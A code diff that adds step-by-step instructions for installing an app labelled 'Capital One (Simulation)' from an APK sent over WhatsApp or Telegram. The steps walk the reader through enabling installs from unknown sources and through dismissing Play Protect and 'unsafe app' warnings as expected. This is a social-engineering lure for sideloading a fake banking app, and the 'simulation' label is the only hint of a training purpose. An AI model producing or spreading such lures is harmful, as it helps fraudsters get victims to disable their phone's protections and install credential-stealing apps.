@@ -1,0 +1,13 @@
+Install Capital One (Simulation)
+
+1. Tap the APK file you received (WhatsApp/Telegram -> Download).
+2. Open your Files app, tap the APK, then tap Install.
+3. If you see "For your security, your phone can't install unknown apps from this
+   source", tap Settings and turn on "Allow from this source" for the app you
+   opened it with (Chrome/Files).
+   (Android 8.0+: Settings > Apps > Special access > Install unknown apps ->
+    pick your browser -> Allow.)
+4. Tap Install again, then Open.
+5. Any "unsafe app" / Play Protect warning is expected for apps outside the store -
+   tap "Install anyway" / "More details > Install anyway".
+6. The app opens full-screen with no address bar. Enjoy!
